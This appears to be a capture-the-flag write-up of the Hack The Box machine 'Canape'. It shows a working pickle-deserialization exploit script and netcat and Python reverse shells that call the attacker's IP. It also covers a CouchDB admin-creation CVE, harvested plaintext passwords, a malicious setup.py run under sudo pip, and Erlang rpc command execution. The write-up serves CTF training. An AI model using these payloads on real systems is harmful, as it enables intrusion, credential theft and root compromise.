---
title: HTB: Canape
url: https://0xdf.gitlab.io/2018/09/15/htb-canape.html
date: 2018-09-15T15:14:18+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, python, pickle, deserialization, couchdb, ctf, htb-canape, flask, pip, sudo, cve-2017-12635, cve-1017-12636, cve-2018-8007, erl, erlang
---

Canape is one of my favorite boxes on HTB. There is a flask website with a pickle deserialization bug. I find that bug by taking advantage of an exposed git repo on the site. With a user shell, we can exploit CouchDB to gain admin access, where we get homer’s password. I went down several rabbit holes trying to get code execution through couchdb, succeeding with EMPD, succeeding with one config change as root for CVE-2018-8007, and failing with CVE-2017-12636. Finally, I’ll take advantage of our user having sudo rights to run pip, and first get a copy of the flag, and then take it all the way to root shell.

## Box Info

| Name | [Canape](https://hackthebox.com/machines/canape)  [Canape](https://hackthebox.com/machines/canape) [Play on HackTheBox](https://hackthebox.com/machines/canape) |
| --- | --- |
| Release Date | 14 Apr 2018 |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Canape |
| Radar Graph | Radar chart for Canape |
| First Blood User | 03:23:37[no0ne no0ne](https://app.hackthebox.com/users/21927) |
| First Blood Root | 03:47:38[no0ne no0ne](https://app.hackthebox.com/users/21927) |
| Creator | [overcast overcast](https://app.hackthebox.com/users/9682) |

## nmap

There’s a webserver with .git on 80, and ssh running on 65535, and it looks like we’re dealing with Ubuntu:

```

root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.70
Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-17 14:36 EDT
Nmap scan report for 10.10.10.70
Host is up (0.098s latency).
Not shown: 65533 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
65535/tcp open  unknown

root@kali# nmap -A -p 80,65535 -oA nmap/initial 10.10.10.70
Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-17 14:37 EDT
Nmap scan report for 10.10.10.70
Host is up (0.10s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-git:
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                         |_http-title: Simpsons Fan Site
|_http-trane-info: Problem with XML parsing of /evox/about
65535/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA)
|   256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA)
|_  256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%$
, Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   97.70 ms 10.10.14.1
2   98.01 ms 10.10.10.70

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.49 seconds

```

## Website - port 80

### Site

The site is a Simples fan site:

![](https://0xdfimages.gitlab.io/img/canape-web-root.png)

![](https://0xdfimages.gitlab.io/img/canape-web-quotes.png)

![](https://0xdfimages.gitlab.io/img/canape-web-submit.png)

The “Submit A Quote” feature definitely seems like something we’ll want to look at.

### Exposed git Repo

But before playing with the site too much, I’ll check out the .git path identified in the nmap scripts:
![](https://0xdfimages.gitlab.io/img/canape-web-git.png)

When there’s an exposed git repo on a website, we can [get a full history of the site using wget](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/):

```

root@kali# wget --mirror -I .git 10.10.10.70/.git
...

root@kali# cd 10.10.10.70/

root@kali# git checkout -- .

root@kali# ls
__init__.py  robots.txt  static  templates

```

### Source Code

With full access to the source, we see a Flask site. There are two sections that caught my eye.

#### Upload

In the site code, there’s an upload section:

```

...
@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
                outfile.write(char + quote)
                outfile.close()
                success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)
...

```

Interesting notes:
- The user submitted ‘char’ only has to *contain* one of the character names from the whitelist. It doesn’t have to *be* one of the names.
- The user has no control over the name of the file but can know the name of the file.
- Nothing is written to the file outside the two user-provided strings concatenated.
- There’s a comment reference to /check and pickle.

#### /check

Looking down the source, there’s a path for /check:

```

@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item

```

`cPickle.loads` will run the object’s `__reduce__` method when it is unpickled. So an attacker can create a class with a `__reduce__` function that executes their desired commands, pickle an instance of that class, and pass that string to canape.

## www-data Shell

### Outline

Scripted up getting a shell:
- Creates Exploit class which takes a cmd and sets up the `__reduce__` function.
- Command also includes the string “moe” so that it will pass the whitelist.
- Script takes an IP and port to get callback on.
- Default command is using pipes and nc to get a shell on given port/ip.
- Creates an instance of the Exploit class.
- Passes instance to cPickle.dumps to get the serialized string.
- Breaks that string so that all but the last character go into char, and the last char goes into quote.
- Calculates the id that will be used on the server.
- Posts to /submit the char and quote.
- Posts to /check the id.
- Profit!

  ```

  root@kali# ./get_canape_shell.py 10.10.15.48 4444
  [*] Filename will be: d95b296a74924cca43c2e27fa2fadc6f
  [*] Exploit:
  cposix
  system
  p1
  (S'echo moe && rm /tmp/0xdf; mkfifo /tmp/0xdf; cat /tmp/0xdf | /bin/sh -i 2>&1 | nc 10.10.15.48 4444 > /tmp/0xdf'
  tRp2
  .
  [+] Sending exploit...
  [+] Exploit successfully submitted
  [+] Triggering exploit with /check, id = d95b296a74924cca43c2e27fa2fadc6f

  ```

  ```

  root@kali# nc -lnvp 4444
  listening on [any] 4444 ...
  connect to [10.10.15.48] from (UNKNOWN) [10.10.10.70] 58290
  /bin/sh: 0: can't access tty; job control turned off
  $ python -c 'import pty;pty.spawn("bash")'
  www-data@canape:/$

  ```

### Script Source

#### Note

I’ve got the source for my script here, but I’m going to plead with you not to use it. Getting this exploit working was one of the most fun I’ve had on HackTheBox. I’m going to add a section at the end on my approach to this problem. If you haven’t done this box, or are stuck here, jump to the end, read that section, and give it a try before copying and running this script.

#### Code

We’ll use python2 here because the site is running python2, and we want the pickle output to match.

```

#!/usr/bin/env python

import cPickle
import os
import requests
import sys
from hashlib import md5

class Exploit(object):

    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, ('echo moe && ' + self.cmd,))

def main():
    if len(sys.argv) != 3:
        print("{} [ip] [port]".format(sys.argv[0]))
        sys.exit()

    ip = sys.argv[1]
    port = sys.argv[2]
    cmd = "rm /tmp/0xdf; mkfifo /tmp/0xdf; cat /tmp/0xdf | /bin/sh -i 2>&1 | nc {} {} > /tmp/0xdf".format(ip, port)
    exploit = cPickle.dumps(Exploit(cmd))

    char = exploit[:-1]
    quote = exploit[-1:]
    id_ = md5(char+quote).hexdigest()

    print("[*] Filename will be: {}".format(id_))
    print("[*] Exploit:\n{}".format(exploit))
    print("[+] Sending exploit...")
    r = requests.post('http://10.10.10.70/submit', data = {'character': char, 'quote': quote})
    if r.status_code != 200:
        print("[-] Error submitting exploit to /submit")
        sys.exit()
    print("[+] Exploit successfully submitted")

    print("[+] Triggering exploit with /check, id = {}".format(id_))
    try:
        r = requests.post('http://10.10.10.70/check', data = {'id': id_}, timeout=1)
    except:
        pass

if __name__ == "__main__":
    main()

```

## PrivEsc: www-data –> homer

There are a few interesting artifacts on the box, but it turns out that the path forward is in the CouchDB instance.

### CouchDB

#### Enumeration

The page source also showed that the simpsons quotes were stored in a couchdb:

```

app.config.update(
    DATABASE = "simpsons"
)
db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]

```

The couchdb is only on localhost:

```

www-data@canape:/var/www/git$ netstat -ano | grep "LISTEN "
netstat -ano | grep "LISTEN "
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:5984          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:5986          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:41991           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:4369            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::65535                :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::4369                 :::*                    LISTEN      off (0.00/0/0)

```

To interact with couchdb, use curl from the local access. The passwords and \_users dbs seem interesting, but neither is accessible:

```

www-data@canape:/var/www/git$ curl http://localhost:5984/_all_dbs
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]

```

We can list ids in a database at the `/[database name]/_all_docs` path. To get an individual document, we visit `/[database name]/id`

```

www-data@canape:/var/www/git$ curl http://localhost:5984/simpsons/_all_docs
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}

www-data@canape:/var/www/git$ curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}

www-data@canape:/var/www/git$ curl http://localhost:5984/passwords
{"error":"unauthorized","reason":"You are not authorized to access this db."}

www-data@canape:/var/www/git$ curl http://localhost:5984/_users
{"db_name":"_users","update_seq":"17-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQGPoiQFIJlkD1bHiU-dA0hdPFgdMz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavcTo_YARO19_H6HqH0AUQt0L1MWAOGZbz8","sizes":{"file":103818,"external":4447,"active":7737},"purge_seq":0,"other":{"data_size":4447},"doc_del_count":1,"doc_count":9,"disk_size":103818,"disk_format_version":6,"data_size":7737,"compact_running":false,"instance_start_time":"0"}

www-data@canape:/var/www/git$ curl http://localhost:5984/_users/_all_docs
{"error":"unauthorized","reason":"You are not a server admin."}

```

#### DB Privesc

CVE-2017-12635 is a way for non-authenticated users to get an admin access in couchdb by taking advantage of how Javascript and Erlang json parsers handle duplicate objects.
Reading on CVE-2017-12635:
- https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
- https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635

So, with CVE-2017-12635, to add an admin user, we just need to use an HTTP PUT:

```

www-data@canape:/var/www/git$ curl -X PUT -d '{"type":"user","name":"0xdf","roles":["_admin"],"roles":[],"password":"df"}' localhost:5984/_users/org.couchdb.user:0xdf -H "Content-Type:application/json"
{"ok":true,"id":"org.couchdb.user:0xdf","rev":"1-72477c12e81d377e933683b8b73f9a86"}

```

Because we have a “roles” object in there twice, the CouchDB Javascript validation will only see the second one (empty), but then Erlang json parser will keep both, and let us be an admin.

#### Enumeration as admin

Now, we can use the creds for the added admin user to read the rest of the db:

```

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/passwords
{"db_name":"passwords","update_seq":"46-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkR2PoiQFIJlkD1bHik-dA0hdPGF1CSB19QTV5bEASYYGIAVUOp8YtQsgavcTo_YARO39rER8AQRR-wCiFuhetiwA7ytvXA","sizes":{"file":222462,"external":665,"active":1740},"purge_seq":0,"other":{"data_size":665},"doc_del_count":0,"doc_count":4,"disk_size":222462,"disk_format_version":6,"data_size":1740,"compact_running":false,"instance_start_time":"0"}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/passwords/_all_docs
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}

```

#### Further CouchDB Exploitation

There’s 3 further ways to attack CouchDB, but since we just got SSH keys, they aren’t necessary for Canape. If you’re interested, check out the [Beyond Root - CouchDB](#couchdb-execution) section at the end.

### SSH as homer

#### Shell Access

That first password from the couchdb enumeration, `"item": "ssh"`, is promising. We noticed in initial enumeration that SSH was running on 65535. We try to ssh as the only user on the box, homer, with the password, “0B4jyA0xtytZi7esBNGp”, and it works:

```

root@kali# ssh -p 65535 homer@10.10.10.70
homer@10.10.10.70's password:
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Fri Apr 20 01:42:09 2018 from 10.10.15.168
homer@canape:~$ id
uid=1000(homer) gid=1000(homer) groups=1000(homer)

```

#### user.txt

On as homer, user.txt is now readable:

```

homer@canape:~$ wc -c user.txt
33 user.txt

homer@canape:~$ cat user.txt
bce91869...

```

## Privesc: homer –> root

### sudo pip

homer can run pip with sudo:

```

homer@canape:/dev/shm$ sudo -l
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *

```

That means I’m going to write a malicious `setup.py` file.

### Read root.txt

Make a malicious setup.py file that will get root.txt:

```

from setuptools import setup
from setuptools.command.install import install

class Exploit(install):
    def run(self):
        with open('/root/root.txt', 'r') as fin:
            with open('/dev/shm/0xdf', 'w') as fout:
                fout.write(fin.read())

setup(
    cmdclass={
        "install": Exploit
    }
)

```

From there, just run pip on the local directory:

```

homer@canape:/dev/shm$ ls
setup.py

homer@canape:/dev/shm$ sudo pip install .
The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Processing /dev/shm
Installing collected packages: UNKNOWN
  Running setup.py install for UNKNOWN ... done
Successfully installed UNKNOWN

homer@canape:/dev/shm$ ls
0xdf  setup.py

homer@canape:/dev/shm$ cat 0xdf
928c3df1...

```

### root Shell

Just getting the flag isn’t fun. Let’s use the setup.py to get a root shell. I’ll use the python reverse shell code here:

```

import os
import socket
import subprocess

from setuptools import setup
from setuptools.command.install import install

class Exploit(install):
    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.15.48",8088))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p = subprocess.call(["/bin/sh", "-i"])

setup(
    cmdclass={
        "install": Exploit
    }
)

```

```

homer@canape:/dev/shm$ sudo pip install .
The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Processing /dev/shm
Installing collected packages: UNKNOWN
  Running setup.py install for UNKNOWN ... -

```

```

root@kali# nc -lnvp 8088
listening on [any] 8088 ...
connect to [10.10.15.48] from (UNKNOWN) [10.10.10.70] 41568
# id
uid=0(root) gid=0(root) groups=0(root)

```

## Beyond Root

### Approach to Pickle Exploit

#### Overview

Getting this exploit working was one of my favorite challenges on HackTheBox. For HTB, this was a relatively complex exploit to get right. You had to get everything just right so that your string made it through the server’s sanitization checks and stored it in the proper place and format. Lots of people (myself included) pushed through this with a lot of trial and error. The difference between hating that process and loving it is how you approach it.

The good news you, if you have the source code for the site. The best thing you can do it start with as small pieces and build your exploit.

#### Build a Payload That Works

To get a payload that works, start with a python script that uses pickle to serialize a class to a file. Then open the python shell and `import cPickle` and then loads it, just like in the script. Did it work? Once you have that, you can be confident that your code is good.

Also, make sure you’re using the same version of Python as the server, as pickle is not the same between legacy python and python3.

#### Stand Up the Server

You’ve got the source for the entire site. You can run a copy locally. It is written in python using the Flask framework, so starting it is as simple as running `python __init__.py`…

```

root@kali# python __init__.py
Traceback (most recent call last):
  File "__init__.py", line 1, in <module>
    import couchdb
ImportError: No module named couchdb

```

Ok, so it’s not that simple. But the part of the site we’re working with doesn’t need CouchDB. So let’s comment all that stuff out. Alternatively, you could install CouchDB, configure it to match what the python expects, enter some quotes… So once you get those comments done, you’ve got a running site:

```

root@kali# python __init__mod.py
 * Serving Flask app "__init__mod" (lazy loading)
 * Environment: production
   WARNING: Do not use the development server in a production environment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)

```

![1536975608244](https://0xdfimages.gitlab.io/img/1536975608244.png)

#### Check Your File

Not getting shell? Well, you submit to the `/submit` path, and it saves your input to a file. Then that file is loaded. What if you open a python terminal and pickle load that file? Does it work? If yes, then the problem is in `/check`. If not, then debug how the site is saving the file.

#### Add Print Statements

Go into the code that you’re interacting with and add print statements. If you’re not getting the output you expect, maybe an `if` isn’t evaluating as you expect. Even some simple `print "waypoint #1"` like statements can be helpful.

#### Summary

You can do this, and you will enjoy it! Good luck!

### CouchDB Execution

#### Execution Through EMPD

In the CouchDB docs, in the [cluster set-up section](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup), it talks about the different ports used by CouchDB:

> CouchDB in cluster mode uses the port `5984` just as standalone, but it also uses `5986` for node-local APIs.
>
> Erlang uses TCP port `4369` (EPMD) to find other nodes, so all servers must be able to speak to each other on this port. In an Erlang Cluster, all nodes are connected to all other nodes. A mesh.

And then there’s an interesting warning:

![1536931232858](https://0xdfimages.gitlab.io/img/1536931232858.png)

If we look in the process list, we can see that cookie, “monster”:

```

www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config

```

We also see that CouchDB is running as homer.

If we look at the ports listening on canape, we see not only both CouchDB ports, but also that epmd is listening on 4369 (we’ll cheat here and show the output from a root shell to see the processes):

```

# netstat -nlpt
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      918/sshd
tcp        0      0 127.0.0.1:5984          0.0.0.0:*               LISTEN      815/beam
tcp        0      0 127.0.0.1:5986          0.0.0.0:*               LISTEN      815/beam
tcp        0      0 0.0.0.0:44135           0.0.0.0:*               LISTEN      815/beam
tcp        0      0 0.0.0.0:34416           0.0.0.0:*               LISTEN      1959/beam
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1058/apache2
tcp        0      0 0.0.0.0:4369            0.0.0.0:*               LISTEN      825/epmd
tcp6       0      0 :::65535                :::*                    LISTEN      918/sshd
tcp6       0      0 :::4369                 :::*                    LISTEN      825/epmd

```

We can connect to epmd with erl, The Erlang Emulator. We need to give it two parameters. `-sname` can be anything, just what we are known as in the cluster. `-setcookie` is the auth from the warning on the CouchDB site. erl throws an error if our `HOME` variable isn’t set, but that’s easy enough to fix:

```

www-data@canape:/$ HOME=/ erl -sname 0xdf -setcookie monster
Eshell V7.3  (abort with ^G)
(0xdf@canape)1>

```

Erlang has an [os module](http://erlang.org/doc/man/os.html) which can be used to call system-specific functions. So if we run it here, we get the results from our current process:

```

(0xdf@canape)1> os:cmd("whoami").
"www-data\n"

```

Erlang also has an [rpc module](http://erlang.org/doc/man/rpc.html). It has a call function that takes a node, module, function, and arguments. We can use that to run commands through the CouchDB process.

If we check our current nodes, it’s empty:

```

(0xdf@canape)2> nodes().
nodes().

```

When we issue the rpc call, it will actually add the code for us (assuming our cookie matches):

```

(0xdf@canape)3> rpc:call('couchdb@localhost', os, cmd, [whoami]).
rpc:call('couchdb@localhost', os, cmd, [whoami]).
"homer\n"

(0xdf@canape)3> nodes().
nodes().
[couchdb@localhost]

```

Now, we want to get a full shell. To run a command that’s anything more than a single word, we’ll put it in `""`s. To get a shell, we’ll use a python reverse shell, and be careful to escape correctly:

```

(0xdf@canape)4> rpc:call('couchdb@localhost', os, cmd, ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\", 9005));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).

```

```

root@kali# nc -lnvp 9005
listening on [any] 9005 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.70] 60162
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(homer) gid=1000(homer) groups=1000(homer)

```

Now that we have a shell as homer, we could grab the user flag, and continue towards privesc. However, without homer’s password, we won’t be able to sudo as required in the path above.

#### Unsuccessful Attempt Via CVE-2017-12636

CVE-2017-12636 allows for code execution through the couchdb process. However, it won’t work in this configuration.

There are a few POCs out there as reference:
- https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py
- https://www.exploit-db.com/exploits/44913/

We’d need to write a new query\_server, and then invoke that. When Canape was released, most of the POCs were for couchdb 1.x, but this box is running 2, so the query\_servers path from most of the POCs doesn’t exist. That’s changed now, but we’ll walk the same steps. First, get the version, and show that the 1.X path doesn’t exist:

```

www-data@canape:/var/www/git$ curl http://localhost:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/_config/query_servers/
{"error":"not_found","reason":"Database does not exist."}

```

Update with the new path for 2.0:

```

www-data@canape:/var/www/git$ curl 'http://0xdf:df@localhost:5984/_membership'
{"all_nodes":["couchdb@localhost"],"cluster_nodes":["couchdb@localhost"]}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
{"coffeescript":"./bin/couchjs ./share/server/main-coffee.js","javascript":"./bin/couchjs ./share/server/main.js"}

```

From there, we should add a query\_server and then invoke it, but we aren’t able to.

```

www-data@canape:/var/www/git$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
{"error":"badmatch","reason":"{badrpc,{'EXIT',{{{badmatch,{error,eacces}},\n                  [{config_writer,save_to_file,2,\n                                  [{file,\"src/config_writer.erl\"},{line,38}]},\n                   {config,handle_call,3,[{file,\"src/config.erl\"},{line,222}]},\n                   {gen_server,try_handle_call,4,\n                               [{file,\"gen_server.erl\"},{line,629}]},\n                   {gen_server,handle_msg,5,\n                               [{file,\"gen_server.erl\"},{line,661}]},\n                   {proc_lib,init_p_do_apply,3,\n                             [{file,\"proc_lib.erl\"},{line,240}]}]},\n                 {gen_server,call,\n                             [config,\n                              {set,\"query_servers\",\"cmd\",\n                                   \"/sbin/ifconfig > /tmp/df\",true,nil}]}}}}","ref":1617834159}

```

Some Googling shows that this is an issue with permissions. In fact, if we check with out root shell, we can see that the `local.ini` file is not writable by anyone, let alone www-data:

```

root@canape:/home/home/etc# ls -ls local.ini
8 -r--r--r-- 1 homer homer 4841 Sep 14 17:11 local.ini

```

So that’s a dead end for Canape. But if we want to try to get it working, we can make it readable with our root or homer access, and continue down this path. We’ll make a backup of the original so we can see what changes:

```

root@canape:/# cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
root@canape:/# chmod 666 /home/homer/etc/local.ini

```

Now, back to our www-data shell:

```

www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
""

```

We get back the previous value for the cmd query server, which means success. And in the root shell, we can see it worked:

```

root@canape:/home/homer/etc# diff local.ini local.ini.bk
48c48
< cmd = /sbin/ifconfig > /tmp/df
---
> cmd =

```

Now, we should be able to create a db, and then a document in that db, and the request it with a view that maps our query\_server to get execution.

Create db and document:

```

www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","god","passwords","simpsons","vultest"]
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df'
{"ok":true}
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","df","passwords","simpsons"]

www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
{"ok":true,"id":"zero","rev":"1-967a00dff5e02add41819138abb3284d"}

```

Request it in a view. The db will complain about headers, but if we work with it, we can get a bit further:

```

www-data@canape:/dev/shm$ curl -X POST 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"df": {"map": ""} }, "language": "cmd"}'
{"error":"bad_request","reason":"Referer header required."}

www-data@canape:/dev/shm$ curl -X POST 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"df": {"map": ""} }, "language": "cmd"}' -H "Referer: http://127.0.0.1:5984
{"error":"bad_request","reason":"Referer header must match host."}

